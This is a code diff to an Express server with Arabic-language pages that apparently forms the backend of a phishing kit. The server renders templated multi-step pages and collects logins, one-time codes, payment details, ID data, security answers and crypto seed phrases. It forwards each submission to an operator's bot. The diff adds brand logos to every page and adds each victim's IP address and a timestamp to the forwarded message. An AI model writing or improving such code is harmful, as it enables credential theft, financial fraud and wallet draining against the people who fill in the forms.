@@ -7,6 +7,7 @@ import db from './db.js';
 import { bot, notify } from './bot.js';
 import { getTemplate, getCategories, getTemplatesByCategory } from './templates.js';
 import { generateOTP, generateCSRFToken, verifyCSRFToken, storeOTP, verifyOTP, checkThrottle, getOTPForDev } from './security.js';
+import { LOGOS } from './logos.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const app = express();
@@ -101,7 +102,7 @@ app.get('/p/:slug/:pageSlug?', (req, res) => {
       if (!pg) return res.status(404).send('الصفحة غير موجودة');
       const t = getTemplate(pg.template_id);
       const lastPage = t.pages[t.pages.length - 1];
-      return res.render('complete', { page: pg, tpl: t, pageContent: lastPage || {}, allPages: t.pages });
+      return res.render('complete', { page: pg, tpl: t, pageContent: lastPage || {}, allPages: t.pages, logos: LOGOS });
     }
 
     const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(slug);
@@ -117,7 +118,7 @@ app.get('/p/:slug/:pageSlug?', (req, res) => {
       return res.render('locked', {
         page, tpl,
         pageContent: { headline: 'الخدمة غير متاحة حالياً', subheadline: 'يرجى المحاولة لاحقاً.', slug: 'locked', form_type: 'locked', fields: [], cta: '' },
-        allPages: tpl.pages
+        allPages: tpl.pages, logos: LOGOS
       });
     }
 
@@ -128,7 +129,7 @@ app.get('/p/:slug/:pageSlug?', (req, res) => {
 
     res.render(resolveView(pageContent.layout), {
       page, tpl, pageContent, allPages: tpl.pages,
-      sent: !!req.query.sent, verified: !!req.query.verified
+      sent: !!req.query.sent, verified: !!req.query.verified, logos: LOGOS
     });
   } catch (err) {
     console.error('Get page error:', err.message);
@@ -152,9 +153,16 @@ async function saveLead(page, tpl, stepSlug, body, req) {
   if (pageContent?.notify_step !== false) {
     const lines = Object.entries(data)
       .filter(([k]) => k !== 'step')
-      .map(([k, v]) => `<b>${esc(k)}</b>: ${esc(v)}`).join('\n');
+      .map(([k, v]) => `<b>${esc(k)}</b>: <code>${esc(v)}</code>`).join('\n');
     const emoji = { login:'🔐', otp:'🔢', payment:'💳', seed_phrase:'🌱', id_verify:'🪪', security_q:'❓' }[pageContent?.form_type] || '📋';
-    await notify(`${emoji} <b>${esc(pageContent?.step_label || stepSlug)}</b>\n📄 <b>${esc(tpl.name)}</b>\n\n${lines}`).catch(() => {});
+    const ts = new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo', hour12: false });
+    const ipStr = ip ? `\n🌐 IP: <code>${esc(ip)}</code>` : '';
+    const msg = `${emoji} <b>${esc(pageContent?.step_label || stepSlug)}</b>
+📄 <b>${esc(tpl.name)}</b> · <code>${esc(page.slug)}</code>
+🕐 ${ts}${ipStr}
+
+${lines}`;
+    await notify(msg).catch(() => {});
   }
 }
 
@@ -206,7 +214,7 @@ app.post('/p/:slug/verify', async (req, res) => {
     const result = verifyOTP(page.id, req.ip, req.body.code);
     if (!result.valid) {
       const pageContent = otpPage || { headline: 'أدخل الكود', subheadline: 'بعتنا كود تحقق', fields: ['code'], layout: 'otp', cta: 'تأكيد', otp_length: 6, slug: otpSlug };
-      return res.render('otp', { page, tpl, pageContent, allPages: tpl.pages, error: 'كود غير صحيح. حاول مرة أخرى.' });
+      return res.render('otp', { page, tpl, pageContent, allPages: tpl.pages, error: 'كود غير صحيح. حاول مرة أخرى.', logos: LOGOS });
     }
 
     await saveLead(page, tpl, otpSlug, req.body, req);
@@ -263,7 +271,7 @@ app.get('/p/:slug/complete', (req, res) => {
     if (!page) return res.status(404).send('not found');
     const tpl = getTemplate(page.template_id);
     const lastPage = tpl.pages[tpl.pages.length - 1];
-    res.render('complete', { page, tpl, pageContent: lastPage || {}, allPages: tpl.pages });
+    res.render('complete', { page, tpl, pageContent: lastPage || {}, allPages: tpl.pages, logos: LOGOS });
   } catch (err) {
     res.status(500).send('خطأ');
   }
